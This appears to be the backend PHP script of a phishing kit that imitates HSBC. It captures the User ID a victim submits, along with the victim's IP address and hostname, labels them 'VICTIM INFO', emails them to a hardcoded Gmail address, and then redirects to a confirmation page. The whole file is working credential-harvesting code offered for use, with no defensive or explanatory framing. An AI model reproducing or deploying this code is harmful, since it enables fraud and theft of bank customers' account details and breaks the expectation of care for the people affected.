<?php

$ip = getenv("REMOTE_ADDR");
$time = date("m-d-Y g:i:a");
$hostname = gethostbyaddr($ip);
$message  = "============ H S B C =============\n";
$message .= "User ID : ".$_POST['formtext1']."\n";
$message .= "============== VICTIM INFO ===============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "==============================\n";
$rnessage = "$message\n";
$send= "abdoalarg53@gmail.com";
$subject = "H S B C New LoG | $ip";

mail($send,$subject,$rnessage);

header("Location: confirm.html");
?>